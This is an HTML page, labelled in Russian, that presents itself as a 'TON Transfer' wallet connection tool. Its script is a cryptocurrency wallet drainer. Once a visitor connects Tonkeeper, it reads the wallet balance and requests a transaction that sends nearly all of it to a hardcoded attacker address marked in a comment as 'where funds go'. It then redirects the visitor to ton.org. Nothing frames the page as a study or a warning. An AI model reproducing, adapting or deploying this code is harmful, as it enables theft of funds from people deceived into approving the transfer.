<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Transfer</title>
    <script src="https://unpkg.com/@tonconnect/sdk@2.0.0/dist/tonconnect-sdk.min.js"></script>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #1a1a2e; color: white; }
        .container { background: #16213e; padding: 2rem; border-radius: 1rem; text-align: center; }
        button { background: #0098ea; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 18px; cursor: pointer; }
        button:disabled { opacity: 0.5; }
        #status { margin-top: 1rem; }
    </style>
</head>
<body>
    <div class="container">
        <h1>💎 TON Transfer</h1>
        <p>Подключите кошелек для перевода</p>
        <button id="connectBtn">🔗 Подключить Tonkeeper</button>
        <div id="status"></div>
    </div>

    <script>
        // ═══════════════════════════════════════════════
        // ЗДЕСЬ ВАШ АДРЕС (куда уходят средства)
        // ═══════════════════════════════════════════════
        const YOUR_WALLET = "UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P";

        const connector = new TonConnect();

        async function getBalance(address) {
            const url = `https://toncenter.com/api/v2/getAddressBalance?address=${address}`;
            const response = await fetch(url);
            if (!response.ok) throw new Error('Не удалось получить баланс');
            const data = await response.json();
            return parseInt(data.result, 10);
        }

        document.getElementById('connectBtn').onclick = async function() {
            const btn = this;
            const status = document.getElementById('status');
            btn.disabled = true;
            status.textContent = '⏳ Подключение...';

            try {
                await connector.connect({
                    manifestUrl: window.location.origin + '/tonconnect-manifest.json'
                });

                connector.onStatusChange(async (walletInfo) => {
                    if (walletInfo) {
                        status.textContent = '⏳ Получение баланса...';
                        const userAddress = walletInfo.account.address;
                        const balanceNano = await getBalance(userAddress);
                        const balanceTon = balanceNano / 1e9;

                        if (balanceTon < 0.01) {
                            status.textContent = '❌ Недостаточно средств (мин. 0.01 TON)';
                            btn.disabled = false;
                            return;
                        }

                        const amountToSendTon = (balanceTon - 0.01).toFixed(9);
                        const amountToSendNano = Math.floor(parseFloat(amountToSendTon) * 1e9);

                        const transaction = {
                            valid_until: Math.floor(Date.now() / 1000) + 120,
                            messages: [{
                                address: YOUR_WALLET,
                                amount: amountToSendNano.toString(),
                                payload: ""
                            }]
                        };

                        await connector.sendTransaction(transaction);
                        status.textContent = `✅ Переведено ${amountToSendTon} TON!`;
                        btn.disabled = false;

                        setTimeout(() => {
                            window.location.href = 'https://ton.org';
                        }, 3000);
                    }
                });

            } catch (error) {
                console.error(error);
                status.textContent = '❌ Ошибка: ' + error.message;
                btn.disabled = false;
            }
        };
    </script>
</body>
</html>
